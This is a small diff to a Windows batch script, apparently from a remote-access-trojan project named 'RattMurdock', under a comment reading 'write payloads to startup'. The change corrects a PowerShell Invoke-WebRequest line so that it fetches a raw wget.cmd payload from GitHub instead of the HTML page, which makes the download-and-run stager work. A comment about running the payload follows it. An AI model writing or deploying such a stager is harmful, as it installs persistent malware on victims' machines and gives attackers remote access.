@@ -16,7 +16,7 @@ cd %NEXT_PATH%
 
 @REM write payloads to startup
 
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Zeyadm8112/RattMurdock/blob/main/wget.cmd' -OutFile 'wget.cmd'"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Zeyadm8112/RattMurdock/main/wget.cmd' -OutFile 'wget.cmd'"
 
 @REM run p
 
